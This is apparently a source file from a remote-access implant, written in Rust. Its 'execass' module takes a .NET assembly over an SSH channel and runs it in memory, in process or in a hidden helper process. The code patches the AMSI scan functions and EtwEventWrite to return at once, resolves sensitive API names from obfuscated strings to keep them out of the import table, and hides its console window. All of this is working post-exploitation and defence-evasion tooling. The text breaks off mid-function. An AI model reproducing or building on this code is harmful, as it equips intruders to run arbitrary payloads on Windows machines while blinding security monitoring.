// execass subsystem: Windows-only .NET assembly runner, a faithful port of
// the Go execass engine (request.go + runner_windows.go + helper_windows.go)
// including the go-clr COM hosting chain, AMSI/ETW patching, and stdout/stderr
// redirection. All API/DLL names are resolved at runtime from obfuscated
// strings, so nothing sensitive lands in the import table or .rodata.

use crate::md::Manifest;

const MAX_ARTIFACT_BYTES: usize = 8 * 1024 * 1024;
const DEFAULT_TIMEOUT_SECS: u64 = 30;
const MAX_TIMEOUT_SECS: u64 = 120;
const DEFAULT_OUTPUT_BYTES: i64 = 1024 * 1024;
const DEFAULT_PROCESS_NAME: &str = "notepad.exe";
const HELPER_ARG: &str = "--wrssh-execass-helper";

pub fn manifest() -> Manifest {
    let mut m = Manifest::name_only(&crate::ob!("execass"));
    m.description = crate::ob!("Windows-only .NET assembly runner; reads the artifact from stdin by default.");
    m.version = crate::ob!("1").to_string();
    m.usage = crate::ob!("execass [--artifact <client-path>] [--sha256 <digest>] [--args '<assembly args>'] [--in-process] [--runtime v4] [--timeout 30s] [--output-limit bytes] [--debug]").to_string();
    m.build_tags = vec![crate::ob!("execass")];
    m.platforms = vec![crate::ob!("windows")];
    m.dangerous = true;
    #[cfg(not(target_os = "windows"))]
    {
        m.disabled = true;
    }
    m.timeout_seconds = MAX_TIMEOUT_SECS as i64;
    m.output_bytes = DEFAULT_OUTPUT_BYTES;
    m.stdin_bytes = MAX_ARTIFACT_BYTES as i64;
    m.max_args = 10;
    m
}

#[derive(Default, Clone)]
struct Request {
    artifact_path: String,
    use_stdin: bool,
    sha256: String,
    timeout_secs: u64,
    debug: bool,
    artifact: Vec<u8>,
    in_process: bool,
    runtime: String,
    process_name: String,
    assembly_args: String,
}

fn next_value(args: &[String], i: &mut usize, inline: Option<String>, name: &str) -> Result<String, String> {
    if let Some(v) = inline {
        return Ok(v);
    }
    *i += 1;
    args.get(*i).cloned().ok_or_else(|| format!("flag needs an argument: {name}"))
}

fn parse_request(args: &[String]) -> Result<Request, String> {
    let mut request = Request {
        timeout_secs: DEFAULT_TIMEOUT_SECS,
        runtime: crate::ob!("v4"),
        process_name: DEFAULT_PROCESS_NAME.to_string(),
        ..Default::default()
    };
    let mut output_limit: i64 = DEFAULT_OUTPUT_BYTES;
    let mut timeout_raw = crate::ob!("30s").to_string();
    let mut i = 0;

    while i < args.len() {
        let (flag, inline) = match args[i].split_once('=') {
            Some((f, v)) if f.starts_with('-') => (f.to_string(), Some(v.to_string())),
            _ => (args[i].clone(), None),
        };
        let flag_str = flag.as_str();
        match flag_str {
            f if f == crate::ob!("--artifact") => request.artifact_path = next_value(&args, &mut i, inline, flag_str)?,
            f if f == crate::ob!("--stdin") => request.use_stdin = true,
            f if f == crate::ob!("--sha256") => request.sha256 = next_value(&args, &mut i, inline, flag_str)?,
            f if f == crate::ob!("--timeout") => timeout_raw = next_value(&args, &mut i, inline, flag_str)?,
            f if f == crate::ob!("--output-limit") => {
                let v = next_value(&args, &mut i, inline, flag_str)?;
                output_limit = v.parse::<i64>().map_err(|_| format!("invalid value for --output-limit: {}", v))?;
            }
            f if f == crate::ob!("--debug") => request.debug = true,
            f if f == crate::ob!("--in-process") => request.in_process = true,
            f if f == crate::ob!("--runtime") => request.runtime = next_value(&args, &mut i, inline, flag_str)?,
            f if f == crate::ob!("--process") => request.process_name = next_value(&args, &mut i, inline, flag_str)?,
            f if f == crate::ob!("--process-args") => {
                let _ = next_value(&args, &mut i, inline, flag_str)?;
            }
            f if f == crate::ob!("--ppid") => {
                let _ = next_value(&args, &mut i, inline, flag_str)?;
            }
            f if f == crate::ob!("--args") => request.assembly_args = next_value(&args, &mut i, inline, flag_str)?,
            other => return Err(format!("flag provided but not defined: {other}")),
        }
        i += 1;
    }

    request.artifact_path = request.artifact_path.trim().to_string();
    request.runtime = request.runtime.trim().to_string();
    request.process_name = request.process_name.trim().to_string();
    if !request.artifact_path.is_empty() && request.use_stdin {
        return Err(crate::ob!("--artifact and --stdin are mutually exclusive").to_string());
    }
    if request.artifact_path.is_empty() {
        request.use_stdin = true;
    }
    if request.runtime.is_empty() {
        return Err(crate::ob!("--runtime must not be empty").to_string());
    }
    if !request.in_process && request.process_name.is_empty() {
        return Err(crate::ob!("--process must not be empty").to_string());
    }
    if output_limit <= 0 || output_limit > DEFAULT_OUTPUT_BYTES {
        return Err(format!("--output-limit exceeds maximum of {} bytes", DEFAULT_OUTPUT_BYTES));
    }
    request.sha256 = request.sha256.trim().to_lowercase();
    if !request.sha256.is_empty()
        && (request.sha256.len() != 64 || !request.sha256.chars().all(|c| c.is_ascii_hexdigit()))
    {
        return Err(crate::ob!("--sha256 must be a SHA-256 hex digest").to_string());
    }
    let timeout = parse_go_duration(&timeout_raw).map_err(|e| format!("invalid --timeout: {}", e))?;
    if timeout.is_zero() {
        return Err(crate::ob!("--timeout must be positive").to_string());
    }
    if timeout.as_secs() > MAX_TIMEOUT_SECS {
        return Err(format!("--timeout exceeds maximum of {}s", MAX_TIMEOUT_SECS));
    }
    request.timeout_secs = timeout.as_secs().max(1);
    Ok(request)
}

fn parse_go_duration(value: &str) -> Result<std::time::Duration, String> {
    let raw = value.trim();
    let (millis, unit) = raw.split_at(raw.find(|c: char| !c.is_ascii_digit() && c != '.').unwrap_or(raw.len()));
    let number: f64 = millis.parse().map_err(|_| format!("invalid duration \"{}\"", raw))?;
    let factor: f64 = match unit {
        "" | "s" => 1.0,
        "ms" => 0.001,
        "m" => 60.0,
        "h" => 3600.0,
        _ => return Err(format!("unknown unit in duration \"{}\"", raw)),
    };
    Ok(std::time::Duration::from_secs((number * factor) as u64))
}

async fn load_artifact<S: From<(russh::ChannelId, russh::ChannelMsg)> + Send + Sync + 'static>(
    request: &mut Request,
    io: &mut crate::md::ModuleIo<S>,
) -> Result<(), String> {
    let data = if request.use_stdin {
        io.read_stdin(MAX_ARTIFACT_BYTES + 1)
            .await
            .map_err(|e| e.to_string())?
    } else {
        std::fs::read(&request.artifact_path).map_err(|e| e.to_string())?
    };
    if data.len() > MAX_ARTIFACT_BYTES {
        return Err(format!("artifact exceeds maximum size of {} bytes", MAX_ARTIFACT_BYTES));
    }
    if !request.sha256.is_empty() {
        use sha2::{Digest, Sha256};
        let digest = Sha256::digest(&data);
        if hex_encode(&digest) != request.sha256 {
            return Err(crate::ob!("artifact SHA-256 mismatch").to_string());
        }
    }
    request.artifact = data;
    Ok(())
}

fn hex_encode(data: &[u8]) -> String {
    data.iter().map(|b| format!("{:02x}", b)).collect()
}

// shlex-style split for assembly arguments (quotes and # comments, close to
// google/shlex used by the Go engine).
pub fn shlex_split(input: &str) -> Result<Vec<String>, String> {
    let mut args = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let mut escaped = false;
    let mut has_token = false;
    let mut chars = input.chars().peekable();

    while let Some(ch) = chars.next() {
        if escaped {
            current.push(ch);
            escaped = false;
            has_token = true;
            continue;
        }
        match quote {
            Some(q) => {
                if ch == q {
                    quote = None;
                } else if q == '"' && ch == '\\' {
                    escaped = true;
                } else {
                    current.push(ch);
                }
            }
            None => match ch {
                '\\' => {
                    escaped = true;
                }
                '\'' | '"' => {
                    quote = Some(ch);
                    has_token = true;
                }
                '#' if !has_token => {
                    while let Some(&next) = chars.peek() {
                        if next == '\n' {
                            break;
                        }
                        chars.next();
                    }
                }
                c if c.is_whitespace() => {
                    if has_token {
                        args.push(std::mem::take(&mut current));
                        has_token = false;
                    }
                }
                c => {
                    current.push(c);
                    has_token = true;
                }
            },
        }
    }
    if quote.is_some() {
        return Err(crate::ob!("unclosed quote in assembly arguments").to_string());
    }
    if has_token {
        args.push(current);
    }
    Ok(args)
}

fn base64_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
    for chunk in data.chunks(3) {
        let b = [chunk[0], *chunk.get(1).unwrap_or(&0), *chunk.get(2).unwrap_or(&0)];
        let triple = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | b[2] as u32;
        out.push(ALPHABET[(triple >> 18) as usize & 0x3f] as char);
        out.push(ALPHABET[(triple >> 12) as usize & 0x3f] as char);
        out.push(if chunk.len() > 1 { ALPHABET[(triple >> 6) as usize & 0x3f] as char } else { '=' });
        out.push(if chunk.len() > 2 { ALPHABET[triple as usize & 0x3f] as char } else { '=' });
    }
    out
}

fn base64_decode(input: &str) -> Result<Vec<u8>, String> {
    const TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut lookup = [255u8; 256];
    for (index, byte) in TABLE.iter().enumerate() {
        lookup[*byte as usize] = index as u8;
    }
    let mut out = Vec::with_capacity(input.len() / 4 * 3);
    let mut buffer: u32 = 0;
    let mut bits = 0u32;
    for ch in input.bytes() {
        if ch == b'=' || ch == b'\n' || ch == b'\r' {
            continue;
        }
        let value = lookup[ch as usize];
        if value == 255 {
            return Err(crate::ob!("invalid base64").to_string());
        }
        buffer = (buffer << 6) | value as u32;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buffer >> bits) as u8);
        }
    }
    Ok(out)
}

// Minimal JSON for the helper protocol (fixed known shape, obfuscated keys).
fn helper_request_json(artifact_b64: &str, runtime: &str, assembly_args: &str, debug: bool) -> String {
    let escape = |v: &str| v.replace('\\', "\\\\").replace('"', "\\\"");
    format!(
        "{{\"{}\":\"{}\",\"{}\":\"{}\",\"{}\":\"{}\",\"{}\":{}}}",
        crate::ob!("artifactBase64"),
        artifact_b64,
        crate::ob!("runtime"),
        escape(runtime),
        crate::ob!("assemblyArgs"),
        escape(assembly_args),
        crate::ob!("debug"),
        debug
    )
}

fn helper_json_string_field(input: &str, key: &str) -> Option<String> {
    let marker = format!("\"{}\":\"", key);
    let start = input.find(&marker)? + marker.len();
    let rest = &input[start..];
    let mut out = String::new();
    let mut escaped = false;
    for ch in rest.chars() {
        if escaped {
            out.push(ch);
            escaped = false;
            continue;
        }
        match ch {
            '\\' => escaped = true,
            '"' => return Some(out),
            c => out.push(c),
        }
    }
    None
}

fn helper_json_bool_field(input: &str, key: &str) -> bool {
    input.contains(&format!("\"{}\":true", key))
}

pub async fn run<S: From<(russh::ChannelId, russh::ChannelMsg)> + Send + Sync + 'static>(
    args: &[String],
    io: &mut crate::md::ModuleIo<S>,
) -> Result<(), String> {
    let mut request = parse_request(args)?;
    load_artifact(&mut request, io).await?;
    if request.artifact.is_empty() {
        return Err(crate::ob!("artifact is empty").to_string());
    }

    let timeout = std::time::Duration::from_secs(request.timeout_secs);
    let outcome = tokio::time::timeout(timeout, execute(request.clone(), &mut io_clone(io))).await;
    match outcome {
        Err(_) => Err(format!("command timed out after {}s", request.timeout_secs)),
        Ok(result) => result,
    }
}

fn io_clone<S: From<(russh::ChannelId, russh::ChannelMsg)>>(io: &mut crate::md::ModuleIo<S>) -> IoRef<S> {
    IoRef { io }
}

struct IoRef<'a, S: From<(russh::ChannelId, russh::ChannelMsg)>> {
    io: &'a mut crate::md::ModuleIo<S>,
}

impl<S: From<(russh::ChannelId, russh::ChannelMsg)> + Send + Sync + 'static> IoRef<'_, S> {
    async fn write_out(&mut self, text: &str) {
        self.io.stdout(text.as_bytes().to_vec()).await;
    }
    async fn write_err(&mut self, text: &str) {
        self.io.stderr(text.as_bytes().to_vec()).await;
    }
}

async fn execute<S: From<(russh::ChannelId, russh::ChannelMsg)> + Send + Sync + 'static>(
    request: Request,
    io: &mut IoRef<'_, S>,
) -> Result<(), String> {
    #[cfg(target_os = "windows")]
    {
        if request.in_process {
            execute_in_process(request, io).await
        } else {
            execute_out_of_process(request, io).await
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (request, io);
        Err(crate::ob!("execass is unsupported on this platform").to_string())
    }
}

#[cfg(target_os = "windows")]
async fn execute_in_process<S: From<(russh::ChannelId, russh::ChannelMsg)> + Send + Sync + 'static>(
    request: Request,
    io: &mut IoRef<'_, S>,
) -> Result<(), String> {
    let parsed_args = shlex_split(&request.assembly_args)
        .map_err(|e| format!("{}{}", crate::ob!("failed to parse assembly arguments: "), e))?;

    let request_for_task = request.clone();
    let parsed_for_task = parsed_args.clone();
    let (stdout_tx, mut stdout_rx) = tokio::sync::mpsc::unbounded_channel::<(bool, String)>();
    let handle = tokio::task::spawn_blocking(move || {
        let (stdout, stderr) = crate::md::execass::clr::invoke_in_process(&request_for_task, &parsed_for_task);
        let _ = stdout_tx.send((true, stdout));
        let _ = stdout_tx.send((false, stderr));
    });
    while let Some((is_stdout, text)) = stdout_rx.recv().await {
        if !text.is_empty() {
            if is_stdout {
                io.write_out(&text).await;
            } else {
                io.write_err(&text).await;
            }
        }
    }
    handle.await.map_err(|e| e.to_string())?;
    Ok(())
}

#[cfg(target_os = "windows")]
async fn execute_out_of_process<S: From<(russh::ChannelId, russh::ChannelMsg)> + Send + Sync + 'static>(
    request: Request,
    io: &mut IoRef<'_, S>,
) -> Result<(), String> {
    if request.process_name != DEFAULT_PROCESS_NAME {
        io.write_err(&crate::ob!("[WRN] Custom process injection flags are not supported; using isolated helper process"))
            .await;
    }

    let executable = std::env::current_exe()
        .map_err(|e| format!("{}{}", crate::ob!("failed to resolve current executable: "), e))?
        .to_string_lossy()
        .into_owned();

    let request_json = helper_request_json(
        &base64_encode(&request.artifact),
        &request.runtime,
        &request.assembly_args,
        request.debug,
    );
    let json_for_task = request_json.clone();
    let out = tokio::task::spawn_blocking(move || -> Result<(String, String), String> {
        use std::io::Write;
        use std::process::{Command, Stdio};
        let mut child = Command::new(&executable)
            .arg(crate::ob!("--wrssh-execass-helper"))
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .creation_flags_windows()
            .spawn()
            .map_err(|e| format!("{}{}", crate::ob!("failed to start helper process: "), e))?;
        {
            let stdin = child.stdin.as_mut().ok_or(crate::ob!("failed to open helper stdin").to_string())?;
            stdin
                .write_all(json_for_task.as_bytes())
                .map_err(|e| format!("{}{}", crate::ob!("failed to send helper request: "), e))?;
        }
        drop(child.stdin.take());
        let output = child
            .wait_with_output()
            .map_err(|e| e.to_string())?;
        Ok((
            String::from_utf8_lossy(&output.stdout).into_owned(),
            String::from_utf8_lossy(&output.stderr).into_owned(),
        ))
    })
    .await
    .map_err(|e| e.to_string())?;

    match out {
        Ok((stdout, stderr)) => {
            if !stdout.is_empty() {
                io.write_out(&stdout).await;
            }
            if !stderr.is_empty() {
                io.write_err(&stderr).await;
            }
            Ok(())
        }
        Err(error) => Err(error),
    }
}

#[cfg(target_os = "windows")]
trait WindowsSpawnExt {
    fn creation_flags_windows(&mut self) -> &mut Self;
}

#[cfg(target_os = "windows")]
impl WindowsSpawnExt for std::process::Command {
    fn creation_flags_windows(&mut self) -> &mut Self {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        self.creation_flags(CREATE_NO_WINDOW)
    }
}

/// Helper entry point: `svc --wrssh-execass-helper` reads a JSON request from
/// stdin, hosts the CLR, executes the assembly, prints captured output.
#[cfg(target_os = "windows")]
pub fn run_helper() -> i32 {
    use std::io::Read;
    let mut input = String::new();
    if std::io::stdin().read_to_string(&mut input).is_err() {
        eprintln!("{}", crate::ob!("[ERR] invalid helper request"));
        return 1;
    }
    let artifact_b64 = match helper_json_string_field(&input, &crate::ob!("artifactBase64")) {
        Some(value) => value,
        None => {
            eprintln!("{}", crate::ob!("[ERR] invalid helper request"));
            return 1;
        }
    };
    let runtime = helper_json_string_field(&input, &crate::ob!("runtime")).unwrap_or_else(|| crate::ob!("v4").to_string());
    let assembly_args = helper_json_string_field(&input, &crate::ob!("assemblyArgs")).unwrap_or_default();
    let debug = helper_json_bool_field(&input, &crate::ob!("debug"));

    let artifact = match base64_decode(&artifact_b64) {
        Ok(artifact) => artifact,
        Err(error) => {
            eprintln!("{} {}", crate::ob!("[ERR]"), error);
            return 1;
        }
    };
    if artifact.is_empty() {
        eprintln!("{}", crate::ob!("[ERR] artifact is empty"));
        return 1;
    }
    let parsed_args = match shlex_split(&assembly_args) {
        Ok(args) => args,
        Err(error) => {
            eprintln!("{} {}", crate::ob!("[ERR]"), error);
            return 1;
        }
    };

    let request = Request {
        runtime,
        debug,
        artifact,
        in_process: true,
        ..Default::default()
    };
    let (stdout, stderr) = crate::md::execass::clr::invoke_in_process(&request, &parsed_args);
    if !stdout.is_empty() {
        clr::write_orig_stdout(&stdout);
    }
    if !stderr.is_empty() {
        clr::write_orig(&format!("{}", stderr));
    }
    0
}

// ---------------------------------------------------------------------------
// CLR hosting (port of Ne0nd0g/go-clr subset used by the Go engine)
// ---------------------------------------------------------------------------

#[cfg(target_os = "windows")]
pub mod clr {
    use std::ffi::c_void;

    type Hresult = i32;
    type Raw = *mut c_void;

    #[link(name = "kernel32")]
    extern "system" {
        fn LoadLibraryA(name: *const u8) -> Raw;
        fn GetProcAddress(module: Raw, name: *const u8) -> Raw;
        fn lstrlenW(string: *const u16) -> i32;
        fn VirtualProtect(address: *mut c_void, size: usize, new_protect: u32, old_protect: *mut u32) -> i32;
        fn CreatePipe(read: *mut Raw, write: *mut Raw, attributes: *mut c_void, size: u32) -> i32;
        fn ReadFile(handle: Raw, buffer: *mut u8, size: u32, read: *mut u32, overlapped: *mut c_void) -> i32;
        fn CloseHandle(handle: Raw) -> i32;
    }

    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct Guid {
        data1: u32,
        data2: u16,
        data3: u16,
        data4: [u8; 8],
    }

    const CLSID_CLR_META_HOST: Guid = Guid {
        data1: 0x9280188d,
        data2: 0x0e8e,
        data3: 0x4867,
        data4: [0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde],
    };
    const IID_ICLR_META_HOST: Guid = Guid {
        data1: 0xd332db9e,
        data2: 0xb9b3,
        data3: 0x4125,
        data4: [0x82, 0x07, 0xa1, 0x48, 0x84, 0xf5, 0x32, 0x16],
    };
    const IID_ICLR_RUNTIME_INFO: Guid = Guid {
        data1: 0xbd39d1d2,
        data2: 0xba2f,
        data3: 0x486a,
        data4: [0x89, 0xb0, 0xb4, 0xb0, 0xcb, 0x46, 0x68, 0x91],
    };
    const CLSID_COR_RUNTIME_HOST: Guid = Guid {
        data1: 0xcb2f6723,
        data2: 0xab3a,
        data3: 0x11d2,
        data4: [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e],
    };
    const IID_ICOR_RUNTIME_HOST: Guid = Guid {
        data1: 0xcb2f6722,
        data2: 0xab3a,
        data3: 0x11d2,
        data4: [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e],
    };
    const IID_APP_DOMAIN: Guid = Guid {
        data1: 0x05f696dc,
        data2: 0x2b29,
        data3: 0x3663,
        data4: [0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13],
    };

    const VT_EMPTY: u16 = 0;
    const VT_BSTR: u16 = 8;
    const VT_UI1: u16 = 17;
    const VT_VARIANT: u16 = 12;
    const VT_ARRAY: u16 = 0x2000;

    #[repr(C)]
    struct Variant {
        vt: u16,
        reserved: [u16; 3],
        value: usize,
        extra: [u8; 8],
    }

    unsafe fn resolve(module: &str, function: &str) -> Result<Raw, String> {
        let module_bytes: Vec<u8> = module.bytes().chain(std::iter::once(0)).collect();
        let loaded = LoadLibraryA(module_bytes.as_ptr());
        if loaded.is_null() {
            return Err(format!("{}{}", crate::ob!("cannot load "), module));
        }
        let function_bytes: Vec<u8> = function.bytes().chain(std::iter::once(0)).collect();
        let address = GetProcAddress(loaded, function_bytes.as_ptr());
        if address.is_null() {
            return Err(format!("{}{}", crate::ob!("cannot resolve "), function));
        }
        Ok(address)
    }

    fn wide(value: &str) -> Vec<u16> {
        value.encode_utf16().chain(std::iter::once(0)).collect()
    }

    unsafe fn read_wide(ptr: *const u16) -> String {
        if ptr.is_null() {
            return String::new();
        }
        let len = lstrlenW(ptr);
        String::from_utf16_lossy(std::slice::from_raw_parts(ptr, len.max(0) as usize))
    }

    unsafe fn slot(object: Raw, index: usize) -> Raw {
        let vtable = *(object as *mut *mut Raw);
        *vtable.add(index)
    }

    // Each COM call below transmutes an explicit function signature from
    // the interface vtable slot, mirroring go-clr's slot layout.

    struct HostState {
        metahost: Raw,
        runtime_info: Raw,
        host: Raw,
    }

    static mut HOST: Option<HostState> = None;
    static mut ORIG_STDOUT: Raw = std::ptr::null_mut();
    static mut ORIG_STDERR: Raw = std::ptr::null_mut();
    pub(crate) fn write_orig(text: &str) {
        unsafe {
            if ORIG_STDERR.is_null() {
                eprint!("{}", text);
                return;
            }
            write_all_handle(ORIG_STDERR, text.as_bytes());
        }
    }

    pub(crate) fn write_orig_stdout(text: &str) {
        unsafe {
            if ORIG_STDOUT.is_null() {
                print!("{}", text);
                return;
            }
            write_all_handle(ORIG_STDOUT, text.as_bytes());
        }
    }

    unsafe fn write_all_handle(handle: Raw, mut bytes: &[u8]) {
        let Ok(proc) = resolve(&crate::ob!("kernel32.dll"), &crate::ob!("WriteFile")) else {
            return;
        };
        let write_file: unsafe extern "system" fn(Raw, *const u8, u32, *mut u32, *mut c_void) -> i32 =
            std::mem::transmute(proc);
        while !bytes.is_empty() {
            let mut written: u32 = 0;
            if write_file(handle, bytes.as_ptr(), bytes.len() as u32, &mut written, std::ptr::null_mut()) == 0 || written == 0 {
                return;
            }
            bytes = &bytes[written as usize..];
        }
    }

    static mut STDOUT_BUFFER: Option<std::sync::Mutex<Vec<u8>>> = None;
    static mut STDERR_BUFFER: Option<std::sync::Mutex<Vec<u8>>> = None;
    static mut STDOUT_WRITE: Raw = std::ptr::null_mut();
    static mut STDERR_WRITE: Raw = std::ptr::null_mut();

    unsafe fn patch_procedure(module: &str, function: &str) -> Result<(), String> {
        let address = resolve(module, function)?;
        let byte_ptr = address as *mut u8;
        if *byte_ptr == 0xC3 {
            return Ok(());
        }
        let mut old_protect: u32 = 0;
        if VirtualProtect(address, 1, 0x04 /* PAGE_READWRITE */, &mut old_protect) == 0 {
            return Err(format!("{}{}", crate::ob!("VirtualProtect failed for "), function));
        }
        *byte_ptr = 0xC3;
        let mut restore: u32 = 0;
        VirtualProtect(address, 1, old_protect, &mut restore);
        Ok(())
    }

    unsafe fn patch_amsi_etw(debug: bool) -> Result<(), String> {
        let _ = debug;
        let targets = [
            (crate::ob!("amsi.dll"), crate::ob!("AmsiScanBuffer")),
            (crate::ob!("amsi.dll"), crate::ob!("AmsiInitialize")),
            (crate::ob!("amsi.dll"), crate::ob!("AmsiScanString")),
            (crate::ob!("ntdll.dll"), crate::ob!("EtwEventWrite")),
        ];
        for (module, function) in targets {
            patch_procedure(&module, &function)?;
        }
        Ok(())
    }

    unsafe fn redirect_output() -> Result<(), String> {
        // Ensure a console exists (hidden), then point the process
        // STDOUT/STDERR handles at fresh pipes we can drain.
        let kernel32 = crate::ob!("kernel32.dll");
        let get_console_window: unsafe extern "system" fn() -> Raw =
            std::mem::transmute(resolve(&kernel32, &crate::ob!("GetConsoleWindow"))?);
        let console = get_console_window();
        if console.is_null() {
            let alloc: unsafe extern "system" fn() -> i32 =
                std::mem::transmute(resolve(&kernel32, &crate::ob!("AllocConsole"))?);
            alloc();
            let show: unsafe extern "system" fn(Raw, i32) -> i32 =
                std::mem::transmute(resolve(&crate::ob!("user32.dll"), &crate::ob!("ShowWindow"))?);
            show(get_console_window(), 0);
        }

        let mut stdout_read: Raw = std::ptr::null_mut();
        let mut stderr_read: Raw = std::ptr::null_mut();
        let mut stdout_write: Raw = std::ptr::null_mut();
        let mut stderr_write: Raw = std::ptr::null_mut();
        if CreatePipe(&mut stdout_read, &mut stdout_write, std::ptr::null_mut(), 0) == 0
            || CreatePipe(&mut stderr_read, &mut stderr_write, std::ptr::null_mut(), 0) == 0
        {
            return Err(crate::ob!("CreatePipe failed").to_string());
        }

        let get_std_handle: unsafe extern "system" fn(i32) -> Raw =
            std::mem::transmute(resolve(&kernel32, &crate::ob!("GetStdHandle"))?);
        // Grab the real console/ssh handles before swapping so Rust-side output
        // keeps flowing to the operator (Go caches these at runtime startup).
        ORIG_STDOUT = get_std_handle(-11);
        ORIG_STDERR = get_std_handle(-12);

        let set_std_handle: unsafe extern "system" fn(i32, Raw) -> i32 =
            std::mem::transmute(resolve(&kernel32, &crate::ob!("SetStdHandle"))?);
        set_std_handle(-11, stdout_write); // STD_OUTPUT_HANDLE
        set_std_handle(-12, stderr_write); // STD_ERROR_HANDLE

        STDOUT_BUFFER = Some(std::sync::Mutex::new(Vec::new()));
        STDERR_BUFFER = Some(std::sync::Mutex::new(Vec::new()));
        STDOUT_WRITE = stdout_write;
        STDERR_WRITE = stderr_write;

        for (handle, buffer_slot) in [(stdout_read as usize, 0usize), (stderr_read as usize, 1usize)] {
            std::thread::spawn(move || unsafe {
                let handle = handle as Raw;
                let mut chunk = [0u8; 8192];
                loop {
                    let mut read: u32 = 0;
                    if ReadFile(handle, chunk.as_mut_ptr(), chunk.len() as u32, &mut read, std::ptr::null_mut()) == 0 || read == 0 {
                        break;
                    }
                    let target = if buffer_slot == 0 { &STDOUT_BUFFER } else { &STDERR_BUFFER };
                    if let Some(buffer) = target.as_ref() {
                        if let Ok(mut guard) = buffer.lock() {
                            guard.extend_from_slice(&chunk[..read as usize]);
                            if guard.len() > 4 * 1024 * 1024 {
                                guard.clear();
                            }
                        }
                    }
                }
            });
        }
        Ok(())
    }

    unsafe fn load_clr(target_runtime: &str) -> Result<&'static mut HostState, String> {
        if !HOST.is_none() {
            let state_ptr = &raw mut HOST;
            if let Some(state) = (*state_ptr).as_mut() {
                return Ok(state);
            }
        }

        let create_instance: unsafe extern "system" fn(*const Guid, *const Guid, *mut Raw) -> Hresult =
            std::mem::transmute(resolve(&crate::ob!("mscoree.dll"), &crate::ob!("CLRCreateInstance"))?);
        let mut metahost: Raw = std::ptr::null_mut();
        if create_instance(&CLSID_CLR_META_HOST, &IID_ICLR_META_HOST, &mut metahost) != 0 {
            return Err(crate::ob!("there was an error enumerating the installed CLR runtimes").to_string());
        }

        // EnumerateInstalledRuntimes (slot 5) -> IEnumUnknown, pick the first
        // runtime containing the target version, else the last one.
        let enumerate: unsafe extern "system" fn(Raw, *mut Raw) -> Hresult =
            std::mem::transmute::<Raw, _>(slot(metahost, 5));
        let mut enumerator: Raw = std::ptr::null_mut();
        if enumerate(metahost, &mut enumerator) != 0 {
            return Err(crate::ob!("failed to enumerate installed runtimes").to_string());
        }

        let next: unsafe extern "system" fn(Raw, u32, *mut Raw, *mut u32) -> Hresult =
            std::mem::transmute::<Raw, _>(slot(enumerator, 3));

        let mut latest: Raw = std::ptr::null_mut();
        let mut latest_version = String::new();
        loop {
            let mut element: Raw = std::ptr::null_mut();
            let mut fetched: u32 = 0;
            if next(enumerator, 1, &mut element, &mut fetched) != 0 || fetched == 0 {
                break;
            }
            let mut length: u32 = 0;
            let version_string: unsafe extern "system" fn(Raw, *mut u16, *mut u32) -> Hresult =
                std::mem::transmute::<Raw, _>(slot(element, 3)); // ICLRRuntimeInfo::GetVersionString
            version_string(element, std::ptr::null_mut(), &mut length);
            let mut buffer = vec![0u16; length as usize + 1];
            if version_string(element, buffer.as_mut_ptr(), &mut length) == 0 {
                buffer.truncate(length as usize);
                latest = element;
                latest_version = String::from_utf16_lossy(&buffer);
                if latest_version.contains(target_runtime) {
                    break;
                }
            }
        }
        if latest.is_null() {
            return Err(crate::ob!("no CLR runtimes installed").to_string());
        }

        // ICLRMetaHost::GetRuntime (slot 3) with the selected version.
        let get_runtime: unsafe extern "system" fn(Raw, *const u16, *const Guid, *mut Raw) -> Hresult =
            std::mem::transmute::<Raw, _>(slot(metahost, 3));
        let wide_version = wide(&latest_version);
        let mut runtime_info: Raw = std::ptr::null_mut();
        if get_runtime(metahost, wide_version.as_ptr(), &IID_ICLR_RUNTIME_INFO, &mut runtime_info) != 0 {
            return Err(format!("{}{}", crate::ob!("failed to get runtime "), latest_version));
        }

        // ICLRRuntimeInfo::GetInterface (slot 9) -> legacy ICorRuntimeHost.
        let get_interface: unsafe extern "system" fn(Raw, *const Guid, *const Guid, *mut Raw) -> Hresult =
            std::mem::transmute::<Raw, _>(slot(runtime_info, 9));
        let mut host: Raw = std::ptr::null_mut();
        if get_interface(runtime_info, &CLSID_COR_RUNTIME_HOST, &IID_ICOR_RUNTIME_HOST, &mut host) != 0 {
            return Err(crate::ob!("failed to get the runtime host").to_string());
        }

        // ICorRuntimeHost::Start (slot 10).
        let start: unsafe extern "system" fn(Raw) -> Hresult = std::mem::transmute::<Raw, _>(slot(host, 10));
        if start(host) != 0 {
            return Err(crate::ob!("failed to start the runtime host").to_string());
        }

        HOST = Some(HostState {
            metahost,
            runtime_info,
            host,
        });
        match HOST.as_mut() {
            Some(state) => Ok(state),
            None => Err(crate::ob!("failed to store the runtime host").to_string()),
        }
    }

    // SafeArray helpers through oleaut32.
    unsafe fn safe_array_create_vector(element_type: u16, count: u32) -> Result<Raw, String> {
        let create: unsafe extern "system" fn(u16, i32, u32) -> Raw =
            std::mem::transmute(resolve(&crate::ob!("oleaut32.dll"), &crate::ob!("SafeArrayCreateVector"))?);
        let array = create(element_type, 0, count);
        if array.is_null() {
            return Err(crate::ob!("SafeArrayCreateVector failed").to_string());
        }
        Ok(array)
    }

    unsafe fn safe_array_put_element(array: Raw, index: i32, value: *mut c_void) -> Result<(), String> {
        let put: unsafe extern "system" fn(Raw, i32, *mut c_void) -> Hresult =
            std::mem::transmute(resolve(&crate::ob!("oleaut32.dll"), &crate::ob!("SafeArrayPutElement"))?);
        if put(array, index, value) != 0 {
